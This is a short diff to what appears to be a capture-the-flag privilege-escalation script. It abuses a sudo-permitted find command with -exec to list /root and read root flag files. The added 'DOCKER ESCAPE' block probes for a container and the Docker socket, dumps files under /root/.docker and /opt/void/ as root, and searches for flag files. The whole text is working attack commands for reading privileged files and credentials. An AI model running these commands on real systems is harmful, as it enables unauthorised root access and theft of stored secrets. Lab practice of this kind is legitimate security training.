@@ -29,3 +29,12 @@ sudo /usr/bin/find . -exec ls -la /root \; -quit
 sudo /usr/bin/find . -exec cat /root/root_flag.txt \; -quit
 echo "=== READING FINAL ROOT FLAG ==="
 sudo /usr/bin/find . -exec cat /root/root.txt \; -quit
+
+echo "=== DOCKER ESCAPE ==="
+# Check if we're in a container
+cat /proc/1/cgroup
+ls -la /var/run/docker.sock 2>/dev/null
+sudo find /var/run/docker.sock -exec ls -la {} \; 2>/dev/null
+sudo find /root/.docker -type f -exec cat {} \; 2>/dev/null
+sudo find /opt/void/ -type f -exec cat {} \; 2>/dev/null
+sudo find / -name "docker_flag*" -o -name "*docker*flag*" 2>/dev/null
